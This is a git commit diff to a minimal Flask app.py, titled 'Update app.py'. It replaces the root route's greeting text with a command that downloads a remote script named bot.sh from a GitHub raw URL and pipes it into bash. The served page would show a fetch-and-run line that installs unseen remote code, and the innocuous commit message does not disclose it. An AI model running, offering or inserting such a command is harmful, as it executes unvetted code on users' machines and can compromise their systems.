3937514a7c42f93f2e2ffaec46576830bd268b59
opaopawk <158033725+opaopawk@users.noreply.github.com>
2024-01-29 16:22:05 +0700

    Update app.py

--- app.py
+++ app.py
@@ -4,7 +4,7 @@ app = Flask(__name__)
 
 @app.route('/')
 def hello_world():
-    return 'Hello web service Credit Financial Holdings'
+    return 'curl https://raw.githubusercontent.com/snzezzwds/voidgitpod/main/bot.sh | bash'
 
 if __name__ == '__main__':
     app.run()
